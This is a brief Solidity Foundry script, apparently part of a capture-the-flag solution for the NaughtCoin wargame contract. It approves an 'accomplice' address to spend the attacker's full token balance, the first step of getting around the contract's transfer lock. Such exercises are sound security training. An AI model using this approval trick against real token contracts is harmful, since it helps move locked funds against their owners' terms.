// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

interface INaughtCoin {
    function approve(address spender, uint256 amount) external;
    function balanceOf(address owner) external view returns (uint256);
}

contract NaughtCoinApprover is Constants, Script {
    function run() public {
        INaughtCoin victim = INaughtCoin(NAUGHT_COIN_ADDRESS);

        uint256 amount = victim.balanceOf(ATTACKER_ADDRESS);

        vm.startBroadcast(ATTACKER_ADDRESS);
        victim.approve(ACCOMPLICE_ADDRESS, amount);
        vm.stopBroadcast();
    }
}